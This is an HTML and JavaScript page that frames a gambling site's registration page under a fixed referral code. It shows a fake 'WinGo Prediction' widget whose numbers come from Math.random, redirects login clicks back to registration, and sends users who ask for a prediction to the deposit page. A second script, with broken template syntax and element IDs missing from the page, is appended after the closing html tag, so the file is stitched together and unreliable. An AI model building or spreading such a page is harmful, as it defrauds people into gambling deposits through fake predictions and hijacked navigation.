<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0" />
<title>Web Loader</title>

<style>
body {
  margin: 0;
  background: #0f0f0f;
  color: #fff;
  font-family: system-ui, sans-serif;
}

iframe {
  width: 100%;
  height: 100vh;
  border: none;
}

/* ===== WinGo Widget ===== */
#wingoWidget {
  position: fixed;
  top: 0;
  left: 0;
  width: 100%;
  background: #121212;
  color: #fff;
  padding: 12px;
  z-index: 999999;
  display: none;
  box-shadow: 0 2px 10px rgba(0,0,0,.6);
}

#wingoWidget h3 {
  margin: 0 0 6px;
  font-size: 16px;
}

#prediction {
  font-size: 14px;
  margin-bottom: 8px;
}

#prediction span {
  font-weight: bold;
}

#predictBtn {
  width: 100%;
  padding: 10px;
  background: #1e88e5;
  border: none;
  border-radius: 6px;
  color: #fff;
  font-size: 15px;
}
</style>
</head>

<body>

<div id="wingoWidget">
  <h3>ðŸŽ¯ WinGo Prediction</h3>
  <div id="prediction">
    Period: <span id="period">--</span><br>
    Number: <span id="number">--</span>
  </div>
  <button id="predictBtn">Get Prediction</button>
</div>

<iframe id="siteFrame"></iframe>

<audio id="bypassAudio" src="bypass.mp3"></audio>
<audio id="newUserAudio" src="new_user.mp3"></audio>
<audio id="depositAudio" src="deposit_message.mp3"></audio>

<script>
const REGISTER_URL = "https://www.dmwin5.com/#/register?invitationCode=27278184971";
const DEPOSIT_URL  = "https://dmwin5.com/#/recharge"; // replace if needed

const iframe = document.getElementById("siteFrame");
const widget = document.getElementById("wingoWidget");

console.log("Page loaded");

try {
  iframe.src = REGISTER_URL;
} catch (e) {
  console.log("Iframe blocked, redirecting", e);
  location.href = REGISTER_URL;
}

/* ===== SIMULATED URL WATCHER ===== */
setInterval(() => {
  let fakeURL = iframe.src || location.href;

  try {
    // Login detect (SIMULATED)
    if (/login/i.test(fakeURL)) {
      document.getElementById("bypassAudio").play();
      iframe.src = REGISTER_URL;
      console.log("Login detected â†’ redirect register");
    }

    // Home detect
    if (/home|dashboard|lobby|main/i.test(fakeURL)) {
      document.getElementById("newUserAudio").play();
      console.log("Home detected â†’ new user audio");
    }

    // WinGo detect
    if (/wingo|game/i.test(fakeURL)) {
      widget.style.display = "block";
      generatePrediction();
      console.log("WinGo detected â†’ widget shown");
    }

  } catch (err) {
    console.log("Cross-origin access blocked", err);
  }

}, 3000);

/* ===== Prediction Logic ===== */
function generatePrediction() {
  const num = Math.floor(Math.random() * 10);
  const period = Date.now().toString().slice(-6);

  let color = "green";
  if (num === 0 || num === 5) color = "violet";
  else if (num % 2 === 0) color = "red";

  document.getElementById("period").innerText = period;
  document.getElementById("number").innerHTML =
    `<span style="color:${color}">${num}</span>`;
}

document.getElementById("predictBtn").onclick = () => {
  document.getElementById("depositAudio").play();
  setTimeout(() => {
    location.href = DEPOSIT_URL;
  }, 800);
};
</script>

</body>
</html>// CONFIG
const REGISTER_URL = "https://www.dmwin5.com/#/register?invitationCode=27278184971";
const DEPOSIT_URL = "dmwin5.com/#/recharge"; // â† YAHAN APNA DEPOSIT LINK DAAL DE (full URL)
const HOMEPAGE_KEYWORDS = ["home", "dashboard", "main", "lobby"]; // homepage detect

const frame = document.getElementById('main-frame');

// Prediction Functions
function getCurrentPeriod() {
  const now = new Date();
  const y = now.getFullYear();
  const m = String(now.getMonth() + 1).padStart(2, '0');
  const d = String(now.getDate()).padStart(2, '0');
  const base = `\( {y} \){m}${d}10000`;
  const minutes = now.getHours() * 60 + now.getMinutes();
  const startIndex = 9671;
  return base + (startIndex + minutes);
}

function getPrediction() {
  const rn = Math.floor(Math.random() * 10);
  const color = (rn === 0 || rn === 5) ? "violet" : (rn % 2 === 0 ? "red" : "green");
  return rn;
}

function updateWidget() {
  const period = getCurrentPeriod();
  const number = getPrediction();
  document.getElementById('pred-period').innerText = period;
  document.getElementById('pred-number').innerText = number;
}
setInterval(updateWidget, 60000);
updateWidget();

// WinGo detect & widget show + login bypass
setInterval(() => {
  try {
    const doc = frame.contentDocument || frame.contentWindow.document;
    if (!doc) return;

    // Login bypass
    const loginBtns = doc.querySelectorAll('button, a, div');
    loginBtns.forEach(el => {
      const txt = (el.innerText || '').toLowerCase();
      if (txt.includes('login') || el.classList.contains('login') || txt.includes('i have an account')) {
        if (!el.dataset.listener) {
          el.addEventListener('click', (e) => {
            e.preventDefault();
            document.getElementById('bypass-audio').play();
            setTimeout(() => {
              frame.src = REGISTER_URL;
            }, 1500);
          });
          el.dataset.listener = 'added';
        }
      }
    });

    // Welcome audio on homepage
    const url = frame.src;
    if (HOMEPAGE_KEYWORDS.some(k => url.includes(k))) {
      document.getElementById('welcome-audio').play();
    }

    // WinGo game detect â†’ widget show
    const winGoEls = doc.querySelectorAll('button, div, a');
    winGoEls.forEach(el => {
      const txt = (el.innerText || '').toLowerCase();
      if (txt.includes('wingo') || txt.includes('game') || el.className.includes('wingo')) {
        document.getElementById('prediction-widget').style.display = 'block';
      }
    });

  } catch (e) {
    console.log("Iframe access error:", e);
  }
}, 2000);

// Get Prediction click â†’ audio + redirect
document.getElementById('get-pred-btn').onclick = () => {
  document.getElementById('deposit-audio').play();
  setTimeout(() => {
    frame.src = DEPOSIT_URL;
  }, 1500);
};
</script>
</body>
</html>
